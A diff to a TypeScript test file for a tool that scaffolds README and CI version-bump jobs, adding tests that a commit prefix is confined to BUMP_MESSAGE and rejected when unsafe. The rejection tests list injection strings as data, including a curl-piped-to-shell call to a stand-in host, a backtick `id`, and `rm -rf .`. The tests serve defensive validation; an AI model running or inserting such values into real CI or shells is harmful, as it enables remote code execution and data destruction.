@@ -20,6 +20,7 @@ import {
   pushFailureReason,
   commitMessagePrefix,
   commitMessageProblem,
+  commitPrefixProblem,
   commitSubject,
   decideCommitSubject,
   proposalFingerprint,
@@ -225,7 +226,7 @@ describe("skeletonFiles", () => {
     // then the steps come in the order the measurements require
     const steps = [
       "### Moving to versioning by commit",
-      "1. Everyone who shares to this repository updates TeamHandbook to 0.31.0 or later\n   first: `/plugin marketplace update teamhandbook`, then `/reload-plugins`.",
+      "1. Everyone who shares to this repository updates TeamHandbook to 0.31.0 or later\n   first: `claude plugin update handbook@teamhandbook`, then a new session or\n   `/reload-plugins`.",
       "A copy older than 0.29.0 also does not read",
       "2. Merge or close the open requests that raise the version.",
       "whichever of the two is merged second conflicts in",
@@ -270,14 +271,15 @@ describe("skeletonFiles", () => {
     expect(readme).not.toContain("--commit-versioning");
   });
 
-  it("given a teammate whose marketplace does not auto-update, when the README is read, then it names the two commands that bring a merge in", () => {
+  it("given a teammate whose marketplace does not auto-update, when the README is read, then it names the plugin update that brings a merge in and says auto-update does it on its own", () => {
     // given the scaffold for a marketplace called acme-skills
     const readme = skeletonFiles("acme-skills", "git@gitlab.acme.com:a/s.git", "gitlab.acme.com")["README.md"]!;
 
     // when the update section is read, then the merge is not promised to arrive on its own
-    expect(readme).toContain("reaches a teammate's copy when their marketplace updates");
+    expect(readme).toContain("reaches a teammate when their copy of the plugin updates");
     expect(readme).toContain("### Getting new skills");
-    expect(readme).toContain("/plugin marketplace update acme-skills\n/reload-plugins");
+    expect(readme).toContain("claude plugin update acme-skills@acme-skills");
+    expect(readme).toContain("With auto-update on for this marketplace, a merge arrives on its own in your next\nsession.");
     expect(readme).toContain("the notice appears after an update, it does not cause one");
   });
 
@@ -810,21 +812,75 @@ describe("skeletonFiles - the CI has to survive the same rules the developer doe
 
     const ci = files[".gitlab-ci.yml"]!;
     // the bump commit is made on the server and faces the same message rule
-    expect(ci).toContain('git commit -am "TEAM-1 ci: bump plugin version"');
-    // and the guard that stops it looping has to match the prefixed message
-    expect(ci).toContain("$CI_COMMIT_MESSAGE !~ /^TEAM-1 ci: bump plugin version/");
+    expect(ci).toContain('BUMP_MESSAGE: "TEAM-1 ci: bump plugin version"');
+    expect(ci).toContain('git commit -am "$BUMP_MESSAGE"');
+    // and the guard that stops it looping matches the phrase every bump commit carries
+    expect(ci).toContain("$CI_COMMIT_MESSAGE !~ /ci: bump plugin version\\s*$/");
   });
 
   it("given no prefix, when scaffolded, then nothing changes for teams without such rules", () => {
     const files = skeletonFiles("acme", "git@gitlab.com:acme/handbook.git", "gitlab.com", "", true);
 
-    expect(files[".gitlab-ci.yml"]).toContain('git commit -am "ci: bump plugin version"');
+    expect(files[".gitlab-ci.yml"]).toContain('BUMP_MESSAGE: "ci: bump plugin version"');
   });
 
   it("given a GitHub repo, when scaffolded, then its workflow carries the prefix as well", () => {
     const files = skeletonFiles("acme", "https://github.com/acme/handbook", "github.com", "TEAM-1 ", true);
 
-    expect(files[".github/workflows/version-bump.yml"]).toContain('git commit -am "TEAM-1 ci: bump plugin version"');
+    const workflow = files[".github/workflows/version-bump.yml"]!;
+    expect(workflow).toContain('BUMP_MESSAGE: "TEAM-1 ci: bump plugin version"');
+    expect(workflow).toContain('git commit -am "$BUMP_MESSAGE"');
+    expect(workflow).toContain(`if: "!endsWith(github.event.head_commit.message, 'ci: bump plugin version')"`);
+  });
+
+  it.each([
+    ["GitLab", "gitlab.com", ".gitlab-ci.yml"],
+    ["GitHub", "github.com", ".github/workflows/version-bump.yml"],
+  ])("given a %s CI job and a prefix, when scaffolded, then the prefix appears once, as the value of BUMP_MESSAGE, and in no shell line or expression", (_forge, host, path) => {
+    // when
+    const ci = skeletonFiles("acme", "https://git.example.invalid/acme/handbook.git", host, "TEAM-1", true)[path]!;
+
+    // then
+    const lines = ci.split("\n").filter((line) => line.includes("TEAM-1"));
+    expect(lines.map((line) => line.trim())).toEqual(['BUMP_MESSAGE: "TEAM-1 ci: bump plugin version"']);
+  });
+
+  it.each([
+    ['VAN-7 $(curl -s evil.example.invalid|sh)" && echo "'],
+    ["x') || true || startsWith('"],
+    ["TEAM-1`id`"],
+    ["TEAM-1; rm -rf ."],
+    ["TEAM-1 # comment"],
+  ])("given the prefix %j, when a CI job would carry it, then nothing is written", (prefix) => {
+    expect(() => skeletonFiles("acme", "https://git.example.invalid/acme/handbook.git", "gitlab.com", prefix, true)).toThrow(
+      "the commit prefix cannot go into the CI job: it is carrying a character other than letters, digits, spaces and . , : / [ ] ( ) _ -",
+    );
+  });
+});
+
+describe("the CI job's guard against running on its own commit", () => {
+  it.each([
+    ["the bump commit itself", "TEAM-1 ci: bump plugin version", true],
+    ["the bump commit with the newline git keeps", "TEAM-1 ci: bump plugin version\n", true],
+    ["a merge whose title carries the phrase", "Merge branch 'ci-notes' into 'main'\n\nfeat: document the ci: bump plugin version job\n\nSee merge request acme/handbook!4", false],
+    ["a request titled with the phrase and a body", "chore: ci: bump plugin version by hand\n\nThe job was off.", false],
+  ])("given %s, when the GitLab rule reads its message, then the job is skipped only for the bump commit", (_label, message, skipped) => {
+    // given
+    const ci = skeletonFiles("acme", "git@gitlab.com:acme/handbook.git", "gitlab.com", "TEAM-1", true)[".gitlab-ci.yml"]!;
+    const pattern = /\$CI_COMMIT_MESSAGE !~ \/(.+?)\/ &&/.exec(ci)![1]!;
+
+    // then
+    expect(new RegExp(pattern).test(message)).toBe(skipped);
+  });
+});
+
+describe("commitPrefixProblem - what a prefix can be written with", () => {
+  it.each([["OPS-201"], ["PAY"], ["TEAM-1 "], ["feat(skill):"], ["[PAY-12]"], ["OPS/42"], [""], ["ÉQUIPE-3"]])("given %j, when it is checked, then it is accepted", (prefix) => {
+    expect(commitPrefixProblem(prefix)).toBeNull();
+  });
+
+  it.each([['"'], ["'"], ["$"], ["`"], ["\\"], [";"], ["&"], ["|"], ["<"], [">"], ["#"], ["!"], ["*"], ["{"], ["="]])("given a prefix carrying %j, when it is checked, then it is refused", (character) => {
+    expect(commitPrefixProblem(`TEAM-1${character}`)).toBe("carrying a character other than letters, digits, spaces and . , : / [ ] ( ) _ -");
   });
 });
 
